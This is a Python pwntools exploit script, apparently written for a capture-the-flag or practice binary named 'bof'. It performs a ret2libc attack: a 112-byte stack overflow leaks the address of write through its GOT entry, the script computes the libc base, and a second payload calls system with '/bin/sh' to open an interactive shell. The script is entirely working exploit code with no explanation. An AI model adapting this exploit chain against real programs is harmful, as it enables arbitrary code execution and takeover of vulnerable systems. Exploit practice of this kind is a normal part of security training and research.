from pwn import *

s = process("./bof")
elf = ELF("./bof")
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#context.log_level='debug'
#context.terminal=['tmux','splitw','-h']
#context.arch = 'i386'

write_plt = 0x080483c0
write_got = 0x0804a01c
vuln = 0x080484D6

payload = b'a'*112
payload += p32(write_plt)
payload += p32(vuln)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
s.sendlineafter("2015~!\n",payload)
print(payload)

write_addr = u32(s.recv(10))

libc_base = write_addr - libc.sym['write']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search('/bin/sh'))

payload = b'a'*112
payload += p32(system)
payload += p32(vuln)
payload += p32(binsh)
gdb.attach(s)

s.sendline(payload)



s.interactive()
